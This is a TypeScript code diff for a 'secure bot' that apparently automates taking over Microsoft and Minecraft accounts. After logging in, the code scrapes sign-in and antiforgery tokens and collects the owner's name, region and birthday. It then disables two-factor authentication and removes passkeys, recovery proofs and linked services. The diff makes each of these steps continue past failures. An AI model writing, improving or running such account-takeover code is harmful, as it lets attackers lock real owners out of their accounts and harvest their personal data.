@@ -275,33 +275,97 @@ async function getT(jar: CookieJar): Promise<string | null> {
   return m ? m[1] : null;
 }
 
-async function getAMC(jar: CookieJar): Promise<string> {
-  let res = await fetchWithJar(jar, "https://account.microsoft.com", { redirect: "manual" });
-  const loc1 = res.headers.get("location");
-  if (!loc1) throw new Error("No redirect from account.microsoft.com");
-  res = await fetchWithJar(jar, loc1);
-  let text = await res.text();
-  const t = extract(text, /<input\s+type="hidden"\s+name="t"\s+id="t"\s+value="([^"]+)"\s*\/?>/);
+async function getAMC(jar: CookieJar): Promise<string | null> {
+  try {
+    let res = await fetchWithJar(
+      jar,
+      "https://account.microsoft.com",
+      {
+        headers: {
+          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+          "User-Agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+        },
+      },
+      { followRedirects: true, maxRedirects: 12, timeoutMs: 30_000 },
+    );
+    let text = await res.text();
 
-  res = await fetchWithJar(jar, "https://account.microsoft.com/auth/complete-silent-signin?ru=https://account.microsoft.com/auth/complete-silent-signin?ru=https%3A%2F%2Faccount.microsoft.com%2F&wa=wsignin1.0&refd=login.live.com&wa=wsignin1.0", {
-    method: "POST",
-    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: new URLSearchParams({ t }).toString(),
-  });
-  text = await res.text();
-  const href = extract(text, /href="([^"]+)"/);
+    // Silent sign-in form if present
+    const tMatch = text.match(
+      /<input\s+type="hidden"\s+name="t"\s+id="t"\s+value="([^"]+)"\s*\/?>/,
+    );
+    if (tMatch) {
+      res = await fetchWithJar(
+        jar,
+        "https://account.microsoft.com/auth/complete-silent-signin?ru=https%3A%2F%2Faccount.microsoft.com%2F&wa=wsignin1.0&refd=login.live.com",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({ t: tMatch[1] }).toString(),
+        },
+        { followRedirects: true, maxRedirects: 12, timeoutMs: 30_000 },
+      );
+      text = await res.text();
+      const href = text.match(/href="(https:\/\/account\.microsoft\.com[^"]+)"/)?.[1];
+      if (href) {
+        res = await fetchWithJar(jar, href.replace(/&amp;/g, "&"), {
+          headers: {
+            Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+          },
+        }, { followRedirects: true, maxRedirects: 10 });
+        text = await res.text();
+      }
+    }
 
-  await fetchWithJar(jar, href, { redirect: "manual" });
+    // SSO redirect polish path
+    const sso = text.match(
+      /https:\/\/account\.microsoft\.com\/auth\/complete-sso-with-redirect\?state=[A-Za-z0-9_\-+/=]+/,
+    );
+    if (sso) {
+      res = await fetchWithJar(jar, sso[0], {}, { followRedirects: true, maxRedirects: 10 });
+      text = await res.text();
+      const action = text.match(/action="([^"]+)"/)?.[1];
+      const pprid = text.match(/name="pprid"[^>]*value="([^"]+)"/)?.[1];
+      const nap = text.match(/name="NAP"[^>]*value="([^"]+)"/)?.[1];
+      const anon = text.match(/name="ANON"[^>]*value="([^"]+)"/)?.[1];
+      const t = text.match(/name="t"[^>]*value="([^"]+)"/)?.[1];
+      if (action && pprid && nap && anon && t) {
+        res = await fetchWithJar(
+          jar,
+          action,
+          {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: new URLSearchParams({ pprid, NAP: nap, ANON: anon, t }).toString(),
+          },
+          { followRedirects: true, maxRedirects: 10 },
+        );
+        text = await res.text();
+      }
+    }
 
-  res = await fetchWithJar(jar, "https://account.microsoft.com/", {
-    headers: {
-      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
-    },
-  });
-  text = await res.text();
-  const rvt = extract(text, /name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"/s);
-  return rvt;
+    // Final page for antiforgery token
+    res = await fetchWithJar(
+      jar,
+      "https://account.microsoft.com/",
+      {
+        headers: {
+          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+          "User-Agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
+        },
+      },
+      { followRedirects: true, maxRedirects: 8 },
+    );
+    text = await res.text();
+    const rvt = text.match(
+      /name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"/s,
+    )?.[1];
+    return rvt || null;
+  } catch {
+    return null;
+  }
 }
 
 async function getOwnerInfo(jar: CookieJar, verificationToken: string) {
@@ -929,10 +993,7 @@ export async function runSecureBot(
     await log("info", "[secure] Logged in successfully!");
     ensureAlive();
 
-    // Phase 2: Run securing pipeline
-    await log("info", "[secure] Getting cookies...");
-    const apiCanary = await getCookies(jar);
-
+    // Phase 2: Run securing pipeline (post-login steps are best-effort where possible)
     const result: SecureResult = {
       mcUsername: config.mcUsername || "Unknown",
       mcEmail: config.email,
@@ -950,29 +1011,53 @@ export async function runSecureBot(
 
     ensureAlive();
 
-    // Get T
-    await log("info", "[secure] Getting TOS token...");
-    const t = await getT(jar);
-    if (!t) {
-      await log("error", "[secure] Failed to get TOS token");
-      return null;
+    let apiCanary = "";
+    try {
+      await log("info", "[secure] Getting cookies...");
+      apiCanary = await getCookies(jar);
+    } catch (e) {
+      await log(
+        "warn",
+        `[secure] apiCanary failed (continuing): ${e instanceof Error ? e.message : e}`,
+      );
     }
 
     ensureAlive();
 
-    // Get AMC and owner info
-    await log("info", "[secure] Getting verification token...");
-    const verificationToken = await getAMC(jar);
+    let t: string | null = null;
+    try {
+      await log("info", "[secure] Getting TOS token...");
+      t = await getT(jar);
+    } catch (e) {
+      await log("warn", `[secure] TOS token failed: ${e instanceof Error ? e.message : e}`);
+    }
 
     ensureAlive();
 
-    await log("info", "[secure] Getting owner info...");
-    const ownerInfo = await getOwnerInfo(jar, verificationToken);
-    if (ownerInfo) {
-      result.firstName = ownerInfo.firstName;
-      result.lastName = ownerInfo.lastName;
-      result.region = ownerInfo.region;
-      result.birthday = ownerInfo.birthday;
+    let verificationToken: string | null = null;
+    try {
+      await log("info", "[secure] Getting verification token...");
+      verificationToken = await getAMC(jar);
+    } catch (e) {
+      await log(
+        "warn",
+        `[secure] AMC token failed (continuing): ${e instanceof Error ? e.message : e}`,
+      );
+    }
+
+    ensureAlive();
+
+    if (verificationToken) {
+      await log("info", "[secure] Getting owner info...");
+      const ownerInfo = await getOwnerInfo(jar, verificationToken);
+      if (ownerInfo) {
+        result.firstName = ownerInfo.firstName;
+        result.lastName = ownerInfo.lastName;
+        result.region = ownerInfo.region;
+        result.birthday = ownerInfo.birthday;
+      }
+    } else {
+      await log("warn", "[secure] Skipping owner info (no AMC token)");
     }
 
     ensureAlive();
@@ -1014,23 +1099,47 @@ export async function runSecureBot(
 
     ensureAlive();
 
-    // Security steps
-    await log("info", "[secure] Getting AMRP...");
-    await getAMRP(jar, t);
+    // Security steps (need canary/t where applicable — skip gracefully)
+    if (t) {
+      try {
+        await log("info", "[secure] Getting AMRP...");
+        await getAMRP(jar, t);
+      } catch (e) {
+        await log("warn", `[secure] AMRP skipped: ${e instanceof Error ? e.message : e}`);
+      }
+    }
 
     ensureAlive();
 
-    await log("info", "[secure] Disabling 2FA...");
-    await remove2FA(jar, apiCanary);
+    if (apiCanary) {
+      try {
+        await log("info", "[secure] Disabling 2FA...");
+        await remove2FA(jar, apiCanary);
+      } catch (e) {
+        await log("warn", `[secure] remove2FA: ${e instanceof Error ? e.message : e}`);
+      }
+      try {
+        await log("info", "[secure] Removing passkeys...");
+        await removeZyger(jar, apiCanary);
+      } catch (e) {
+        await log("warn", `[secure] removeZyger: ${e instanceof Error ? e.message : e}`);
+      }
+      try {
+        await log("info", "[secure] Removing security proofs...");
+        await removeProofs(jar, apiCanary);
+      } catch (e) {
+        await log("warn", `[secure] removeProofs: ${e instanceof Error ? e.message : e}`);
+      }
+    } else {
+      await log("warn", "[secure] Skipping 2FA/proof removal (no apiCanary)");
+    }
 
-    await log("info", "[secure] Removing passkeys...");
-    await removeZyger(jar, apiCanary);
-
-    await log("info", "[secure] Removing security proofs...");
-    await removeProofs(jar, apiCanary);
-
-    await log("info", "[secure] Removing third-party services...");
-    await removeServices(jar);
+    try {
+      await log("info", "[secure] Removing third-party services...");
+      await removeServices(jar);
+    } catch (e) {
+      await log("warn", `[secure] removeServices: ${e instanceof Error ? e.message : e}`);
+    }
 
     ensureAlive();
 
